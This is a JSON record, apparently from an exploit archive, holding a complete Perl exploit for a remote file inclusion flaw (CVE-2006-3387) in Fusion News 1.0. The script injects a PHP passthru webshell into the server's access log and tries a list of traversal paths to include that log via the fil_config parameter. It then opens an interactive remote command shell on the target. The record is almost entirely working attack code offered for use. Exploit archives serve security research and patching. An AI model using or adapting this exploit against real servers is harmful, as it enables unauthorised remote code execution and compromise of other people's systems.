{
  "id": "1812",
  "title": "Fusion News 1.0 (fil_config) - Remote File Inclusion",
  "cve": "CVE-2006-3387",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\nuse IO::Socket;\r\n\r\n####################################################################################\r\n#                                                                                  #\r\n# Exploit coded by: X0r_1    \t\t\t\t\t\t           #\r\n# Bug found by:     X0r_1\t\t\t\t\t\t\t   #\t\t\t\t\t\t  \r\n# release: 21.05.06     \t\t\t\t\t\t\t   #\r\n# \t\t\t\t\t\t\t\t\t\t   #\r\n# vulnerable code in sources\\post.php at lines 32-35:\t\t\t\t   #\r\n#----------------------------------------------------------------------------------#\r\n#...  \t\t\t\t\t\t\t\t\t\t   #\t\r\n#  global $VARS, $TEMPLATE, $fil_lang, $fil_config, $url_fs, $url_smil, $url_bbco; #\r\n#  include     ($fil_config); \t\t\t\t\t\t\t   #\t\r\n#  include     (\"./sources/js.db.php\");   \t\t\t\t\t   #\t\r\n#... \t\t\t\t\t\t\t\t\t \t   #\t\r\n#----------------------------------------------------------------------------------#\r\n# if register_globals = On you can overwrite the var $fil_config !    \t\t   #\t\r\n####################################################################################\r\n\r\nprint \"==========================================================================\\r\\n\";\r\nprint \"|            Fusion News v.1.0 Remote File Inclusion Exploit             |\\r\\n\";\r\nprint \"|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|\\r\\n\";  \r\nprint \"|  Bug found and exploit coded by: X0r_1                                 |\\r\\n\";   \r\nprint \"|  works just with register_globals = On                                 |\\r\\n\";       \r\nprint \"==========================================================================\\r\\n\\n\\n\";\r\n\r\n\r\n###############################################################################\r\n## !!! Ziel $server und $path von Fusion News m\u00fcssen eingetragen werden !!!  ##\r\n###############################################################################\r\n$server = \"127.0.0.1\";\r\n$path   = \"/news/\";\r\n###############################################################################\r\n\r\n$code  = \"<?php ob_clean();echo _StaRt_;passthru(\\$_GET[cmd]);echo _EnD_;die; ?>\";\r\n\r\n\r\n\r\nsub urlEncode \r\n{\r\n    my ($string) = @_;\r\n    $string =~ s/(\\W)/\"%\" . unpack(\"H2\", $1)/ge;\r\n    #$string# =~ tr/.//;\r\n    return $string;\r\n}\r\n\r\n\r\nsub inject\r\n{\r\n  $log = \"no\";\r\n\r\n  print \"[#]  Verbindung wird hergestellt . . .  \\n\";\r\n\r\n$sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>$server, Timeout  => 10, PeerPort=>\"http(80)\")\r\n        or die \"\\n[X]  es konnte keine Verbindung hergestellt werden ! \\n\";\r\n\r\n  print \"[#]  Verbindung hergestellt !  \\n\";\r\n  print \"[#]  PHP Code wird in die Log Files Injected . . .  \\n\";\r\n\r\n  print $sock \"GET \".$path.\" \".$code.\" HTTP/1.1\\r\\n\";\r\n  print $sock \"Host: \".$server.\"\\r\\n\";\r\n  print $sock \"Connection: close\\r\\n\\r\\n\";\r\n\r\n  print \"[#]  PHP Code in Log File Injected !  \\n\\n\";\r\n  print \"[#]  Suche nach Log File Pfad \\n\";\r\n\r\n# Hier k\u00f6nnen noch mehr m\u00f6gliche Pfade zu den Server logs eingetragen werden !\r\n#\r\n@path= (\r\n\"../../../../../../../../../../apache/logs/access.log\",\r\n\"../../../../../../../../../apache/logs/access.log\",\r\n\"../../../../../../../../apache/logs/access.log\",\r\n\"../../../../../../../apache/logs/access.log\",\r\n\"../../../../../../apache/logs/access.log\",\r\n\"../../../../../apache/logs/access.log\",\r\n\"../../../../apache/logs/access.log\",\r\n\"../../../apache/logs/access.log\",\r\n\"../../apache/logs/access.log\",\r\n\"../apache/logs/access.log\",\r\n\"../../../../../../../../../logs/access.log\",\r\n\"../../../../../../../../logs/access.log\",\r\n\"../../../../../../../logs/access.log\",\r\n\"../../../../../../logs/access.log\",\r\n\"../../../../../logs/access.log\",\r\n\"../../../../logs/access.log\",\r\n\"../../../logs/access.log\",\r\n\"../../logs/access.log\",\r\n\"../logs/access.log\",\r\n\r\n);\r\n\r\n\r\n\r\nfor ($i=0; $i<=$#path; $i++)\r\n  {\r\n \r\nprint \"   [+] Versuche \".$path[$i].\"\\n\";\r\n\r\n$sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>$server, Timeout  => 10, PeerPort=>\"http(80)\")\r\n        or die \"\\n[X]  es konnte keine Verbindung hergestellt werden ! \\n\";\r\n\r\n  print $sock \"GET \".$path.\"sources/post.php?fil_config=\".$path[$i].\"&cmd=echo%20startnow HTTP/1.1\\r\\n\";\r\n  print $sock \"Host: \".$server.\"\\r\\n\";\r\n  print $sock \"Connection: close\\r\\n\\r\\n\";\r\n\r\n$out = \"\";\r\n\r\n    while ($answer = <$sock>) \r\n    {\r\n    $out.=$answer;\r\n    }\r\n    close($sock);\r\n\r\n\r\nif ($out =~ m/_StaRt_(.*?)_EnD_/ms)\r\n  {\r\n  print \"\\n[#] Log File Pfad gefunden ! \\n\\n\";\r\n  print \"==========================================================================\\n\\n\\n\";\r\n  $log = $i;\r\n  $i = $#path\r\n\r\n  } \r\n  }\r\n\r\nif ($log eq \"no\")\r\n  { print \"\\n\\n[X] Log File Pfad konnte nicht gefunden werden ! \\n\\n\"; exit;}\r\n\r\n}\r\n\r\n\r\n\r\n\r\nsub exploit\r\n{\r\n\r\n\r\n$sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>$server, Timeout  => 10, PeerPort=>\"http(80)\")\r\n        or die \"\\n[X]  es konnte keine Verbindung hergestellt werden ! \\n\";\r\n\r\n  print $sock \"GET \".$path.\"sources/post.php?fil_config=\".$path[$log].\"&cmd=\".&urlEncode($cmd).\" HTTP/1.1\\r\\n\";\r\n  print $sock \"Host: \".$server.\"\\r\\n\";\r\n  print $sock \"Connection: close\\r\\n\\r\\n\";\r\n \r\n\r\n while ($answer = <$sock>) \r\n{\r\n $v .= $answer;\r\n}\r\n  close($sock);\r\n\r\n          \r\nif ($v =~ m/_StaRt_(.*?)_EnD_/ms)\r\n  {\r\n   print \"\\n\\n$1\\n\\n\";\r\n  }\r\n\r\n\r\n$answer = \"\";\r\n     $v = \"\";\r\n\r\n&getcmd;\r\n}\r\n\r\n\r\n\r\n\r\nsub getcmd\r\n{\r\n\r\nprint \"\\$Shell > \";\r\n$cmd = \"\";\r\n$cmd = <STDIN>;\r\n     chop($cmd);\r\n\r\nif (!$cmd)\r\n {\r\n print \"\\n>> [  Bitte geben Sie einen Befehl ein ! ]\\n\\n\";\r\n &getcmd;\r\n }\r\n\r\nelsif ($cmd eq \"exit\")\r\n {\r\n exit;\r\n }\r\n\r\n\r\n&exploit\r\n}\r\n\r\n\r\n\r\n  &inject;\r\n  &getcmd;\r\n\r\n# milw0rm.com [2006-05-21]",
  "url": "https://www.exploit-db.com/exploits/1812"
}